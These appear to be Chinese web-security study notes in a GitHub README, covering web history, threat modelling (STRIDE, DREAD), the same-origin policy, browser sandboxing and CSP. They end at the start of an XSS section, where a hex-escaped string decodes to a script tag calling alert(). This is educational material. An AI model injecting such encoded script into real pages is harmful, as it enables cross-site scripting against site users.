Attention: 
> 1. 由于学业的繁忙，我将不定期编辑这个文件。我会继续把各文件夹中的文章编进readme.md中，毕竟各文件夹内的文档可视性并不高(Due to my academic commitments, I will be editing this document from time to time. I will continue to compile the articles in the various folders into a readme.md. After all, there is not much visibility of the documents in each folder.)
> 2. 在阅读各内容之前，建议先阅读rules.md文件(It is recommended to read the rules.md file before reading the individual contents.)
> 3. 我的英语水平非常差，所以本文中的英文可能会出现一些差错，如果发现比较奇怪的英语语法或内容时，建议使用翻译器翻译上方的中文，请谅解(My English is very poor, so there may be some errors in the English in this article. If you find strange English grammar or content, please understand that you are advised to use a translator to translate the Chinese above.)
> 4. 本文章内的所有内容均以中文呈现。本作者现在正在学习英语，现只到达托福60分的水准，等到以后我的英语学习之路基本完成，我会继续编写英文版内容，请谅解(All content in this article is presented in Chinese. The author is currently studying English and has only reached a TOEFL score of 60. Please understand that I will continue to write English content when my English learning journey is basically complete.)
> 5. 文段中存在重复的问题的地方，会只在一处地方讲解(Where there are repetitive questions in the passage, they will be explained in one place only.)
> 6. 一些重要内容会用红色标注，标题会用黄色标注，其中可能还会出现其他颜色，但颜色不会在github界面显示，如果可以，请调至code模式观看，如果将文档下载至本地，则建议使用深色界面观看(Some important content will be marked in red, title will be marked in yellow, and other colours may also appear in it, but the colour will not be displayed in the github interface, if possible, please turn to code mode to watch, if you are downloading a document locally, it is recommended that you use the dark interface to view it)
> 7. 如果现在有需要阅读英文版的文章，请使用翻译器辅助阅读(推荐使用chatGPT进行翻译，因为翻译器不能完整且准确地表达出本文中的专业性知识，若使用chatGPT，建议给一个前情提要)(If you now have to read the English version of the article, please use a translator to assist you in reading it. (It is recommended to use chatGPT for translation, as the translator does not give a complete and accurate representation of the expertise in this article, if you use chatGPT, it is recommended to give a foreword.))
> 8. 如果我的文章中存在任何问题，欢迎大家指出(If there are any problems in my article, please feel free to point them out.)
> 9. 以下内容和各文件夹(文件夹不包括reprint、thematic topic and analysis、tools)中的内容一致，仅为更可观的版本存在于此(The following content corresponds to the content in each folder (folders excluding reprint, thematic topic and analysis, tools), only the more substantial version exists here.)

csdn address:[hackjacking.blog.csdn.net](https://hackjacking.blog.csdn.net/)

# Web

参考资料来源于
> - CSDN
> - GitHub
> - Google
> - 维基百科
> - YouTube
> - MDN Web Docs
> - 其他小型网站与书籍

## <font color="yellow">0x00世界观安全</font>

### <font color="yellow">01 Web发展史</font>

#### <font color="yellow">001 静态网页的诞生</font>

> 1989年，在欧洲粒子物理实验室(粒子物理研究通常与来自世界各地的研究所进行合作)的IT部门工作的Tim Berners-Lee向其领导提出了一项名为Information Management: A Proposal的提议：使来自世界各地的远程站点的研究人员能够组织和汇集信息，在个人计算机上访问大量的科研文献，并建议在文档中链接其他文档，这就是Web的原型
>
> 1990年，Tim以超文本语言HTML为基础在NeXT电脑上发明了最原始的Web浏览器
>
> 1991年，Tim作为布道者在Internet上广泛推广Web的理念，与此同时，美国国家超算应用中心(National Center for Supercomputer Applications)对此表现出了浓厚的兴趣，并开发了名为Mosaic的浏览器，于1993年4月进行了发布
>
> 1994年5月，第一届万维网大会在日内瓦召开
>
> 1994年7月，HTML2规范发布
>
> 1994年9月，因特网工程任务组(Internet Engineering Task Force)设立了HTML工作组
>
> 1994年11月，Mosaic浏览器的开发人员创建了网景公司(Netscape Communications Corp.)，并发布了Mosaic Netscape 1.0 beta浏览器，后改名为Navigator

#### <font color="yellow">002 万维网(W3C)诞生</font>

> 1994年底，由Tim牵头的万维网联盟(World Wide Web Consortium)成立，这标志着万维网的正式诞生
>
> 此时的网页以HTML为主，是纯静态的网页，网页是“只读”的，信息流只能通过服务器到客户端单向流通，由此世界进入了Web 1.0时代
>
> W3C在1994年被创建的目的是，为了完成麻省理工学院(MIT)与欧洲粒子物理研究所(CERN)之间的协同工作，并得到了美国国防部高级研究计划局(DARPA)和欧洲委员会(European Commission)的支持
>
> W3C最重要的工作是发展Web规范(称为推荐，Recommendations)，这些规范描述了Web的通信协议(比如HTML和XHTML)和其他的构建模块

#### <font color="yellow">003 JavaScript的诞生</font>

> 1995年，网景工程师Brendan Eich花了10天时间设计了JavaScript语言。起初这种脚本语言叫做Mocha，后改名LiveScript，后来为了借助Java语言创造良好的营销效果最终改名为JavaScript。网景公司把这种脚本语言嵌入到了Navigator 2.0之中，使其能在浏览器中运行
>
> 与此相对的是，1996年，微软发布了VBScript和JScript。JScript是对JavaScript进行逆向工程的实现，并内置于Internet Explorer 3中。但是JavaScript与JScript两种语言的实现存在差别，这导致了程序员开发的网页不能同时兼容Navigator和Internet Explorer浏览器。Internet Explorer开始抢夺Netscape的市场份额，这导致了第一次浏览器战争

#### <font color="yellow">004 第一次浏览器战争</font>

> Netscape的市场份额逐年萎缩
>
> 1996年11月，为了确保JavaScript的市场领导地位，网景将JavaScript提交到欧洲计算机制造商协会（European Computer Manufacturers Association）以便将其进行国际标准化
> 
> 1997年6月，ECMA以JavaScript语言为基础制定了ECMAScript标准规范ECMA-262。JavaScript是ECMAScript规范最著名的实现之一，除此之外，ActionScript和JScript也都是ECMAScript规范的实现语言。自此，浏览器厂商都开始逐步实现ECMAScript规范
> 
> 1998年6月，ECMAScript2规范发布，并通过ISO生成了正式的国际标准ISO/IEC 16262
> 
> 1999年12月，ECMAScript3规范发布，在此后的十年间，ECMAScript规范基本没有发生变动。ECMAScript3成为当今主流浏览器最广泛使用和实现的语言规范基础
> 
> 第一次浏览器战争以IE浏览器完胜Netscape而结束，IE开始统领浏览器市场，份额的最高峰达到2002年的96%。随着第一轮大战的结束，浏览器的创新也随之减少

#### <font color="yellow">005 动态页面的崛起</font>

> JavaScript诞生之后，可以用来更改前端DOM的样式，实现一些类似于时钟之类的小功能。那时候的JavaScript仅限于此，大部分的前端界面还很简单，显示的都是纯静态的文本和图片。这种静态页面不能读取后台数据库中的数据，为了使得Web更加充满活力，以PHP、JSP、ASP.NET为代表的动态页面技术相继诞生
>
> PHP（PHP：Hypertext Preprocessor）最初是由Rasmus Lerdorf在1995年开始开发的，现在PHP的标准由PHP Group维护。PHP是一种开源的通用计算机脚本语言，尤其适用于网络开发并可嵌入HTML中使用。PHP的语法借鉴吸收C语言、Java和Perl等流行计算机语言的特点，易于一般程序员学习。PHP的主要目标是允许网络开发人员快速编写动态页面
>
> JSP（JavaServer Pages）是由Sun公司倡导和许多公司参与共同创建的一种使软件开发者可以响应客户端请求，从而动态生成HTML、XML或其他格式文档的Web网页的技术标准。JSP技术是以Java语言为基础的。1999年，JSP1.2规范随着J2EE1.2发布
>
> ASP（Active Server Pages）1.0 在1996年随着IIS 3.0而发布。2002年，ASP.NET发布，用于替代ASP
> 
> 随着这些动态服务器页面技术的出现，页面不再是静止的，页面可以获取服务器数据信息并不断更新。以Google为代表的搜索引擎以及各种论坛相继出现，使得Web充满了活力
> 
> 随着动态页面技术的不断发展，后台代码变得庞大臃肿，后端逻辑也越来越复杂，逐渐难以维护。此时，后端的各种MVC框架逐渐发展起来，以JSP为例，Struct、Spring等框架层出不穷
> 
> 从Web诞生至2005年，一直处于后端重、前端轻的状态

#### <font color="yellow">006 XHTML</font>

> 1999年，W3C发布HTML 4.01标准，同年微软推出用于异步数据传输的ActiveX，随即各大浏览器厂商模仿实现了XMLHttpRequest（AJAX雏形）
>
> 2000年，W3C采用了一个大胆的计划，把XML引入HTML，XHTML 1.0作为W3C推荐标准发布
>
> 2001年5月，W3C推出了CSS 3.0规范草案
>
> 2002年到2006年，XHTML 2.0最终放弃
>
> 2009年，W3C宣布XHTML 2.0不再继续，宣告死亡

#### <font color="yellow">007 AJAX的流行</font>

> 在Web最初发展的阶段，前端页面要想获取后台信息需要刷新整个页面，这是很糟糕的用户体验
>
> Google分别在2004年和2005年先后发布了两款重量级的Web产品：Gmail和Google Map。这两款Web产品都大量使用了AJAX技术，不需要刷新页面就可以使得前端与服务器进行网络通信，这虽然在当今看来是理所应当的，但是在十几年前AJAX却是一项革命性的技术，颠覆了用户体验
>
> 随着AJAX的流行，越来越多的网站使用AJAX动态获取数据，这使得动态网页内容变成可能，像Facebook这样的社交网络开始变得繁荣起来，前端一时间呈现出了欣欣向荣的局面
>
> AJAX使得浏览器客户端可以更方便地向服务器发送数据信息，这促进了Web 2.0的发展
>
> Google Trend: AJAX从2005年开始得到开发人员的广泛关注

#### <font color="yellow">008 第二次浏览器大战</font>

> 前端兼容性框架的出现
>
> IE在第一次浏览器大战中击败Netscape赢得胜利，垄断了浏览器市场。作为独裁者，IE并不遵循W3C的标准，IE成了事实标准
>
> Netscape于1998年被AOL收购前创建了Mozilla社区，Firefox于2004年11月首次发布，并且9个月内下载量超过6000万，获取了巨大的成功，IE的主导地位首次受到了挑战，Firefox被认为是Netscape的精神续作
>
> 之后Firefox浏览器一路奋起直追，逐渐蚕食IE市场份额，这引发了第二次浏览器战争。在2008年底时，Firefox的市场份额达到了25%以上，IE则跌至65%以下
>
> 第二次浏览器战争中，随着以Firefox和Opera为首的W3C阵营与IE对抗程度的加剧，浏览器碎片化问题越来越严重，不同的浏览器执行不同的标准，对于开发人员来说这是一个恶梦
>
> 为了解决浏览器兼容性问题，Dojo、jQuery、YUI、ExtJS、MooTools等前端Framework相继诞生。前端开发人员用这些Framework频繁发送AJAX请求到后台，在得到数据后，再用这些Framework更新DOM树
>
> 其中，jQuery独领风骚，几乎成了所有网站的标配。Dojo、YUI、ExtJS等提供了很多组件，这使得开发复杂的企业级Web应用成为可能
>
> Google Trend: 蓝色jQuery，红色Dojo，绿色YUI，紫色ExtJS，黄色MooTools

#### <font color="yellow">009 HTML5</font>

> 1999年，W3C发布了HTML 4.0.1版本，在之后的几年，没有再发布更新的Web标准。随着Web的迅猛发展，旧的Web标准已不能满足Web应用的快速增长
>
> 2004年6月，Mozilla基金会和Opera软件公司在万维网联盟（W3C）所主办的研讨会上提出了一份联合建议书，其中包括Web Forms 2.0的初步规范草案。建议举行一次投票，以表决W3C是否应该扩展HTML和DOM，从而满足Web应用中的新需求。研讨会最后以8票赞成，14票反对否决此建议，这引起一些人的不满，不久后，部分浏览器厂商宣布成立网页超文本技术工作小组（WHATWG），以继续推动该规范的开发工作，该组织再度提出Web Applications 1.0规范草案，后来这两种规范合并形成HTML5。2007年，获得W3C接纳，并成立了新的HTML工作团队。2008年1月22日，第一份正式草案发布
>
> HTML5草案发布不久，Google在2008年12月发布了Chrome浏览器，加入了第二次浏览器大战当中。Chrome使用了Safari开源的WebKit作为布局引擎，并且研发了高效的JavaScript引擎V8
>
> 尽管HTML5在网络开发人员中非常出名了，但是它成为主流媒体的一个话题是在2010年的4月，当时苹果公司的CEO乔布斯发表一篇题为“对Flash的思考”的文章，指出随着HTML5的发展，观看视频或其它内容时，Adobe Flash将不再是必须的。这引发了开发人员间的争论，包括HTML5虽然提供了加强的功能，但开发人员必须考虑到不同浏览器对标准不同部分的支持程度的不同，以及HTML5和Flash间的功能差异
>
> 在第二次浏览器大战中，各个浏览器厂商都以提升JavaScript运行效率和支持HTML5各种新特性为主要目标，促进了浏览器的良性竞争。在这一场战争中，Chrome攻城略地，抢夺IE市场份额。2013年，Chrome超过IE，成为市场份额最高的浏览器。2016年，Chrome占据了浏览器市场的半壁江山
>
> 全球浏览器市场份额（2009-2017）
>
> 自2008年以来，浏览器中不断支持的HTML5新特性让开发者激动不已：WebWorker可以让JavaScript运行在多线程中，WebSocket可以实现前端与后台的双工通信，WebGL可以创建Web3D网页游戏......
>
> 桌面浏览器对HTML5支持程度（2009-2017）
>
> 2014年10月28日，W3C正式发布HTML 5.0推荐标准

#### <font color="yellow">010 Node.js的爆发</font>

> 早在1994年，Netspace就公布了其Netspace Enterprise Server中的一种服务器脚本实现，叫做LiveWire，是最早的服务器端JavaScript，甚至早于浏览器中的JavaScript。对于这门图灵完备的语言，Netspace很早就开始尝试将它用在后端
>
> 微软在1996年发布的IE 3.0中内嵌了自己的JScript语言，其兼容JavaScript语法。1997年年初，微软在它的服务器IIS 3.0中也包含了JScript，这就是我们在ASP中能使用的脚本语言
>
> 1997年，Netspace为了用Java实现JavaScript而创建了Rhino项目，最终Rhino演变成一个基于Java实现的JavaScript引擎，由Mozilla维护并开源。Rhino可以为Java应用程序提供脚本能力。2006年12月，J2SE 6将Rhino作为Java默认的脚本引擎
>
> SpiderMonkey是Mozilla用C/C++语言实现的一个JavaScript引擎，从Firefox 3.5开始作为JavaScript编译引擎，并被CouchDB等项目作为服务端脚本语言使用
>
> 可以看到，JavaScript最开始就能同时运行在前后端，但时在前后端的待遇却不尽相同。随着Java、PHP、.Net等服务器端技术的风靡，与前端浏览器中的JavaScript越来越流行相比，服务端JavaScript逐渐式微
>
> 2008年Chrome发布，其JavaScript引擎V8的高效执行引起了Ryan Dahl的注意。2009年，Ryan利用Chrome的V8引擎打造了基于事件循环的异步I/O框架——Node.js诞生
>
> Node.js具有以下特点
>
> - 基于事件循环的异步I/O框架，能够提高I/O吞吐量
> - 单线程运行，能够避免了多线程变量同步的问题
> - 使得JavaScript可以编写后台代码，前后端编程语言统一
>
> Node.js的出现吸引了很多前端开发人员开始用JavaScript开发服务器代码，其异步编程风格也深受开发人员的喜爱。Node.js的伟大不仅在于拓展了JavaScript在服务器端的无限可能，更重要的是它构建了一个庞大的生态系统
>
> 2010年1月，NPM作为Node.js的包管理系统首次发布。开发人员可以按照CommonJS的规范编写Node.js模块，然后将其发布到NPM上面供其他开发人员使用。目前NPM具有40万左右的模块，是世界上最大的包模块管理系统
>
> 2016年常见包管理系统模块数量，NPM高居榜首
>
> Node.js也催生了node-webkit等项目，用JavaScript开发跨平台的桌面软件也成为可能。Node.js给开发人员带来了无穷的想象，JavaScript大有一统天下的趋势

#### <font color="yellow">011 前端MV*架构</font>

> 随着HTML5的流行，前端不再是人们眼中的小玩意，以前在C/S中实现的桌面软件的功能逐步迁移到了前端，前端的代码逻辑逐渐变得复杂起
>
> 以前只用于后台的`MV*`等架构在前端逐渐使用起来，以下列举了部分常用的`MV*`框架来
>
> 随着这些MV*框架的出现，网页逐渐由Web Site演变成了Web App，最终导致了复杂的单页应用（ Single Page Application）的出现
>
> 移动Web和Hybrid App
>
> 随着iOS和Android等智能手机的广泛使用，移动浏览器也逐步加强了对HTML5特性的支持力度
>
> 移动浏览器对HTML5支持程度（2009-2017）
>
> 移动浏览器的发展，导致了流量入口逐渐从PC分流到移动平台，这是Web发展的新机遇。移动Web面临着更大的碎片化和兼容性问题，jQuery Mobile、Sencha Touch、Framework7、Ionic等移动Web框架也随之出现
>
> 相比于Native App，移动Web开发成本低、跨平台、发布周期短的优势愈发明显，但是Native App的性能和UI体验要远胜于移动Web。移动Web与Native App孰优孰劣的争论愈演愈烈，在无数开发者的实践中，人们发现两者不是替代关系，而是应该将两者结合起来，取长补短，Hybrid技术逐渐得到认同
>
> Hybrid技术指的是利用Web开发技术，调用Native相关API，实现移动与Web二者的有机结合，既能体现Web开发周期短的优势，又能为用户提供Native体验
>
> 根据实现原理，Hybrid技术可以分为两大类
> 
> - 将HTML5的代码放到Native App的WebView控件中运行，WebView为Web提供宿主环境，JavaScript代码通过WebView调用Native API。典型代表有PhoneGap(Cordova)以及国内的AppCan等
> - 将HTML5代码针对不同平台编译成不同的原生应用，实现了Web开发，Native部署。这一类的典型代表有Titanium和NativeScript
>
> Hybrid一系列技术中很难找出一种方案适应所有应用场景，我们需要根据自身需求对不同技术进行筛选与整合

#### <font color="yellow">012 ECMAScript6</font>

> JavaScript语言是ECMAScript标准的一种实现，截止2017年2月，ECMAScript一共发布了7个版本
>
> 1997年6月， ECMAScript 1.0标准发布
>
> 1998年6月，ECMAScript 2.0发布
>
> 1999年12月，ECMAScript 3.0发布
>
> 2007年10月，Mozilla主张的ECMAScript 4.0版草案发布，对3.0版做了大幅升级，该草案遭到了以Yahoo、Microsoft、Google为首的大公司的强烈反对，JavaScript语言的创造者Brendan Eich和IE架构师Chris Wilson甚至在博客上就ES4向后兼容性问题打起了口水仗，最后由于各方分歧太大，ECMA开会决定废弃中止ECMAScript 4.0草案。经各方妥协，在保证向下兼容的情况下，将部分增强的功能放到ECMAScript 3.1标准中，将原有ECMAScript 4.0草案中激进的功能放到以后的标准中。不久，ECMAScript 3.1就改名为ECMAScript 5
>
> 2009年12月，本着'Don’t break the web'原则，ECMAScript 5发布。新增了strict模式、属性getter和setter等
>
> 2011年6月，ECMAScript 5.1发布
>
> 2015年6月，ECMAScript 6.0发布。该版本增加了许多新的语法，包括支持let、const、Arrow function、Class、Module、Promise、Iterator、Generator、Set、Map、async、Symbol、Proxy、Reflect、Decorator等。TC39委员会计划以后每年都发布一个新版本的ECMAScript，所以ECMAScript 6.0改名为ECMAScript 2015
>
> 2016年6月，在ECMAScript 2015的基础上进行了部分增强，发布了ECMAScript 2016
>
> 在ECMAScript的各个版本中，ECMAScript 6.0无疑最受人瞩目的，它增加了许多新特性，极大拓展了JavaScript语法和能力，以至于许多浏览器都只能支持部分ES6中的新特性。随之，Babel和TypeScript逐渐流行起来，编写ES6代码，然后用Babel或TypeScript将其编译为ES5等浏览器支持的JavaScript
>
> ECMAScript以后每年将会发布一个新版本，这无疑将持续促使浏览器厂商不断为JavaScript注入新的功能与特性，JavaScript走上了快速发展的正轨

### <font color="yellow">02 安全世界观</font>

#### <font color="yellow">001 简介</font>

用户的最高权限叫做root(administrator) ，黑客最渴望的就是获得root

黑客使用的漏洞利用代码叫做exploit

黑客中的种类

- 一、精通计算机技术，能自己挖漏洞，并编写exploit，`多为白帽`
- 二、只对攻击本身感兴趣，对技术方面各项的了解比较浅，自己没有动手能力，只能看懂别人的代码，这类黑客被称为Script kids，`这是大多数黑客的类型`，`虽然黑客本身是具有破坏性的，但是第一种黑客是鳳毛麟角`


现实中，真正能够造成大规模破坏的往往不是挖掘并研究漏洞的黑客，而是这些Script Kids

SQL注入、XSS攻击的出现是Web安全史上的一个里程碑

伴随着Web 2.0 的兴起，XSS、CSRF等攻击已经变得更强大了

#### <font color="yellow">002 黑帽子、白帽子</font>

黑帽子：利用黑客技术造成破坏
1. 工作心态方面：
   - 工作心态：找到系统的一个漏洞，达到入侵的目的
   - 工作环境：一个人或小团队(黑客有关)
   - 工作目的：入侵系统，找到对自己价值的数据，以点突破，找到对自己最有作用的点以此渗透
   - 工作观察方面：思考问题的出发点必然是选择性的、微观性的
2. 对待问题方式：
   - 对待问题：为了完成一次入侵，需要利用各种不同漏洞的组合来达到目的

白帽子：精通安全技术，但工作在反黑客领域的网络安全专家
1. 工作心态方面：
    - 工作心态：找到系统的所有漏洞，不有遗漏项，保证系统不再出问题，`不可能做到100%无漏洞，只是让黑客无从下手`
    - 工作环境：为企业或安全公司工作
    - 工作目的：出发点在于解决一切安全问题
    - 工作观察方面：所看所想要全面和宏观
2. 对待问题方式：
    - 对待问题：在设计方案时，如果只看到各种问题组合后产生的效果，就会把事情变得更复杂，难以细致入微地解决根本问题，所以白帽子必然是在不断地分解问题，在对分解后的问题逐个给予解决
    - 选用的方法：客服某种攻击方式，而并非抵御单次攻击

#### <font color="yellow">003 安全的本质</font>

通过安全检测的过程，可与梳理未知的人或物，使其变得可信任，被划分出来的具有不同信任级别的区域，被称为信任域，划分两个信任域的分界线，被称为信任边界

安全问题的考虑选择：选择内容为发生概率高的安全问题，不太会考虑不可能发生的事件

一旦我们做出决策的依据、条件被打破、被绕过，那么就会导致安全假设的前提条件不再可靠，变成一个伪命题

把握住信任条件的度，使其恰到好处，正是设计安全方案的难点所在，也正是安全这门学问的魅力所在

安全是一个持续学习的内容

#### <font color="yellow">004 安全三要素</font>

简称CIA

- 机密性(Confidentiality)：要求保护数据内容不能泄露，加密是实现机密性要求的常见手段
- 完整性(Integrity)：要求保护数据内容是完整、没有更改的，常见的保证一致性的技术手段是数字签名
- 可用性(Availability)：要求保护资源是随需而得的

随着时代的进步，后人又增加了可设计性、不可抵赖性等，但最核心的还是以上三要素在设计安全方案时也要以这三要素为思考的出发点，更全面地思考问题

> 不可抵赖性，又称不可否认性，英文为Non-repudiation，电子商务交易各方在交易完成时要保证的不可抵赖性，指在传输数据时必须携带含有自身特质、别人无法复制的信息，防止交易发生后对行为的否认，通常可通过对发送的消息进行数字签名来实现信息的不可抵赖性

#### <font color="yellow">005 如何实施安全评估</font>

安全评估的过程
1. 资产等级划分

有时候资源的可用性可以理解为数据的可用性，互联网安全的核心问题是数据安全的问题

2. 威胁分析

`威胁：只可能导致对系统或组织危害的事故潜在的起因`，可能造成危害的来源叫做危害；可能出现的损失叫做分险

威胁建模方法 —— STRIDE
- Spoofing(伪装)
	- 定义：冒充他人身份
	- 对应的安全属性：认证
- Tampering(更改)
	- 定义：修改数据或代码
	- 对应的安全属性：完整性
- Repudiation(抵赖)
	- 定义：否认做过的事情
	- 对应的安全属性：不可抵赖性
- InformationDisclosure(信息泄露)
	- 定义：机密信息泄露
	- 对应的安全属性：机密性
- Denial of Service(拒绝服务)
	- 定义：拒绝服务
	- 对应的安全属性：可用性
- Elevation of Privilege(提升权限)
	- 定义：未经授权获得许可
	- 对应的安全属性：授权

在进行威胁分析时，要尽可能地不遗漏威胁，头脑风暴的过程可以确定攻击面(Attack Surface)

漏洞的定义：系统中可能被威胁利用以造成危害的地方

3. 风险分析

`风险：指某种特定的危险事件(事故或意外事件)发生的可能性与其产生的后果的组合`

影响风险高低的因素
  1. 造成损失的大小
  2. 发生的概率

风险程度模型 —— DREAD
- Damage Potential
	- 高：获取完整的验证权限；执行管理员操作；非法上传文件
	- 中：泄露敏感信息
	- 低：泄露其他信息
- Reproducibility
	- 高：攻击者可以重复攻击
	- 中：攻击者可以重复攻击，但有时间限制
	- 低：攻击者很难重复攻击
- Exploitability
	- 高：初学者在短期内能掌握攻击方法
	- 中：熟练的攻击者才能完成这次攻击
	- 低：漏洞利用条件非常苛刻
- Affected Users
	- 高：所有用户，默认设置，关键用户
	- 中：部分用户，非默认配置
	- 低：极少数用户，匿名用户
- Discoverability
	- 高：漏洞很显眼，攻击条件很容易获得
	- 中：在私有区域，部分人能看到，需要深入挖掘漏洞
	- 低：发现该漏洞极为困难

风险高低的定义(高(3)中(2)低(1))
  - Risk = D(a)+R(b)+E(c)+A(d)+D(e) = a+b+c+d+e
		- 高危：Risk = 12～15
		- 中危：Risk = 8～11
		- 低危：Risk = 0～7

<font color="red">模型只是工具，起决定性作用的是人</font>

4. 确认解决方案
解决方案一定要有针对性，针对前三点做出安全方案

安全评估的产出物就是安全解决方案

一个好的安全解决方案须具备以下几点：
  - 能够有效解决问题
  - 用户体验好
  - 高性能
  - 低耦合`耦合度：是对模块间关联程度的度量，耦合的强弱取决于模块间接口的复杂性，调用模块的方式以及通过界面传送数据的多少`

`优势：易于扩展与升级，如果是由专职的安全团队长期维护的系统，有些阶段可以只是实施一次`

#### <font color="yellow">006 白帽子兵法</font>

1. Secure By Default 原则

`最基本也是最重要的原则`

a. 黑白名单

`SSH段口有很多功能可以替代Telent，又可以为FTP、POP、PPP提供一个安全的通道`

`SSH是目前比较可靠的专为远程登录会话和其他网络服务提供安全性的协议`

- 黑名单：不安全程序
- 白名单：较安全程序

如果允许工程师在服务器上随意安装软件的话，则可能会因为安全部门不知道、不熟悉的软件，导致一些漏洞出现，从而增大攻击面

`在电脑系统里，有很多软件都应用到了黑白名单规则，操作系统、防火墙、杀毒软件、邮件系统、应用软件等，凡是涉及到控制方面几乎都应用了黑白名单规则`

b. 最小权限原则

`最小权限是指每个程序和系统用户都应该具有完成任务所必需的最小权限集合，因此，对于系统管理员而言，一个用户应该只能访问履行他的相关职责所需访问的数据和硬件`

最小权限原则要求系统只授予主体必要的权限，而不要过度授权，这样能有效的减少系统、网络、应用、数据库出错的机会

`sudo：linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令`

2. 纵深防御原理

Defense in Depth

- 要在各个不同层面、不同方面实施安全方案，避免出现疏漏，不同安全方案之间需要相互配合，构成一个整体
- 要在正确的地方做正确的事，在解决根本问题的地方实施针对行的安全方案
	
他要求我们深入理解威胁的本质，从而做出正确的应对措施，更全面、正确地看待问题

UTM(Unified Threat Management)统一威胁管理

`纵深防御：通过设置多层重叠的安全防护系统而构成多道防线，使得即使某一防线失效也能被其他防线弥补或纠正，即通过增加系统的防御屏障或将各层之间的漏洞错开的方式防范差错发生的`

3. 数据与代码分离原理
	
这一原则广泛适用于各种由于注入(e.g.：SQL Injection;XSS;CRLF Injection;X-Path Injection)而引发的安全问题场景

缓冲区溢出也可以认为是程序违背了这一原则的后果

`缓冲区是一块连续的计算机内存区域,可保存相同数据类型的多个实例`

`缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容(通常是超过缓冲区能保存的最大数据量的数据)，从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权`

从漏洞成因上看待问题

4. 不可预测性原则

克服攻击方法的角度看问题

Unpredictable

能够有效地对抗基于篡改、伪造的攻击

当token足够复杂时，不能被攻击者在测到

我们无法要求运行的程序没有漏洞，所以要使漏洞的攻击方法失败

需要用到加密算法、随机数算法、哈希算法

#### <font color="yellow">007 总结</font>

安全是一门朴素的学问，也是一种平衡的艺术

## <font color="yellow">0x01 客户端脚本安全</font>

### <font color="yellow">01 浏览器安全</font>

#### <font color="yellow">001 同源策略(Same Origin Policy)</font>

是一种约定，它是浏览器最核心、最基本的安全功能，如果缺少了同源策略，浏览器的正常功能可能都会受到影响

可以说，Web是建立在同源策略之上的

浏览器的同源策略限制了来自不同源的document或脚本，对当前document读取或设置某些属性

对于JavaScript来说，不同的URL会被分为同源与不同源`影响原因：host(域名/IP地址)、子域名、端口、协议`

XMLHttpRequest可以访问同源对象的内容，但同样收到同源的约束，使其不能跨越访问资源，在AJAX应用的开发中尤其注意这一点

除了DOM、Cookie、XMLHttpRequest会受到同源策略的限制，浏览器加载的一些第三方插件也有各自的同源策略`最常见的是Flash、Java Applet、Silverlight、Google Gears都有自己的控制策略`

浏览器的同源策略是浏览器安全的基础，许多客户端脚本攻击，都需要遵守这一原则，因此理解同源策略对于客户端脚本攻击有着重要意义，同源策略一旦被出现的漏洞绕过，也将带来非常严重的后果，很多基于同源策略制定的安全方案将失去效果
`同源是指域名、协议、端口相同`

`同源策略，它是由Netscape提出的一个著名的安全策略`

`同源策略是浏览器的行为，是为了保护本地数据不被JavaScript代码获取回来的数据污染，因此拦截的是客户端发出的请求回来的数据接收，即请求发送了，服务器响应了，但是无法被浏览器接收`

#### <font color="yellow">002 浏览器沙箱</font>

在网页中插入一段恶意代码，利用浏览器漏洞执行任意代码的攻击方式，在黑客圈子里被形象地称为挂马

防挂马操作：浏览器密切结合DEP、ASLR、SafeSEH等保护系统
> Google Chrome流程
>   浏览器进程
>   渲染进程`由Sandbox即沙箱隔离`
>   插件进程`e.g.：将Flash、Java、Pdf进行隔离，因此不会相互影响`
>   扩展进程

现在的Sandbox已经成为泛指资源隔离类模块的代名词

Sandbox的设计目的一般是为了让不可信任的代码运行在一定的环境中，限制不可信任的代码访问隔离区之外的资源

现在了浏览器的内部结构文件已经受到Sandbox的保护，但第三方应用却不受Sandbox的管辖，所以被攻克的浏览器往往是第三方应用的安全漏洞

```text
Sandbox是指一种技术，在这种技术中，软件运行在操作系统受限制的环境中
由于该软件在受限制的环境中运行，即使一个闯入该软件的入侵者也不能无限制访问操作系统提供设施
获得该软件控制权的黑客造成的损失也是有限的
如果攻击者要获得对操作系统的完全控制，他们就不得不攻克沙箱限制，Sandbox也提供深度防御
许多PaaS系统都提供了一个实时运行环境，它的核心就是一个沙箱应用程序
如Azu re和Google App Engime
```

#### <font color="yellow">003 恶意网址拦截</font>

工作原理：一般都是浏览器周期性地从服务器获取一份最新的恶意网址黑名单，如果用户上网时访问的网址在黑名单中，浏览器将弹出警告

常见的恶意网址分类
1. 挂马的网站，这些网站通常包含有恶意的脚本，如JavaScript或Flash，通过利用浏览器的漏洞执行shellcode，在用户电脑中植入木马
2. 钓鱼网站，通过模仿知名网站的相似页面来欺骗用户

除了恶意网址黑名单拦截功能外，主流浏览器都开始支持EV SSL(Extended Validation SSL Certificate)证书，以增强对安全网址的识别，`EV SSL证书是全球数字证书颁发机构与浏览器厂商一起打造的增强型证书`，其主要特色是浏览器会给予EV SSL证书特殊的待遇

EV SSL证书也遵循X509标准，并向前兼容普通证书，如果浏览器不支持EV模式，则会把该证书当作普通证书，如果浏览器支持EV模式，则会在地址栏中特别标注，因此在网站使用了EV SSL证书后，可以教育用户识别真实网站在浏览器地址栏中的绿色表现，以对抗钓鱼网站

#### <font color="yellow">004 高速发展的浏览器安全</font>

现在的浏览器还在不断地更新，不断地推出新的安全功能

CSP(Content Security Policy)这一策略是由安全专家Robert Hanson最早提出的

- 做法：由一个服务器返回一个HTTP头，并在其中描述页面应该遵守的安全策略

浏览器加载的插件也是浏览器安全需要考虑的一个问题：扩展与插件的权限到高于页面JavaScript的权限

#### <font color="yellow">005 总结</font>

浏览器是互联网安全的重要接口，在安全攻防中，浏览器的作用也越来越被人们重视

在以往研究攻防时，大家更重视服务器端漏洞，现在，安全研究的范围已经涵盖了所有用户使用互联网的方式，浏览器正是其中最重要的一个部分

加深理解同源策略，才能把握浏览器安全的本质

随着信息技术的发展，恶意网址检测、插件安全等问题都会显得越来越重要

### <font color="yellow">02 跨站脚本攻击(XSS)</font>

#### <font color="yellow">001 转义字符</font>

首先要认识一下`\`，`\`在JavaScript有着特殊的用途，它是转义的符号

e.g.：`\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x27\x70\x6F\x72\x75\x69\x6E\x27\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E`

这些就是经过编码后的字符，因为前面的`\`缘故，所以后面的这些字符在JavaScript中都会被还原

